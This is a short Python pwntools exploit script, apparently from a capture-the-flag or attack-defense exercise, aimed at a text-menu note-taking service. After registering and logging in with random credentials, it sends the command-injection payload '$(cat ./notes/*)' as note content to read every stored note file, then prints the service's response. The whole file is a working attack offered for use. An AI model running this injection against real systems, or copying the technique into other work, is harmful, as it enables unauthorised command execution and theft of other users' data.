#!/usr/bin/env python3

from pwn import *

def get_random_string(N=16):
    return ''.join(random.choice(string.ascii_letters) for i in range(N))

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} <target> <port>')
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

io = remote(ip, port)

username  = get_random_string()
password  = get_random_string()
note_name = get_random_string()

# register
io.sendlineafter(b"Choose an option: ", b"1")
io.sendlineafter(b"Enter new username: ", username.encode())
io.sendlineafter(b"Enter new password: ", password.encode())
io.sendline()

# login
io.sendlineafter(b"Choose an option: ", b"2")
io.sendlineafter(b"Username: ", username.encode())
io.sendlineafter(b"Password: ", password.encode())
io.sendline()

# RCE in note content
io.sendlineafter(b"Choose an option: ", b"3")
io.sendlineafter(b"Enter TODO name (e.g., todo1): ", note_name.encode())
io.sendlineafter(b"Enter your note content: ", b"$(cat ./notes/*)")
io.sendline()

# list notes
io.sendlineafter(b"Choose an option: ", b"4")

print(io.recvall(timeout=5), flush=True)

io.close()
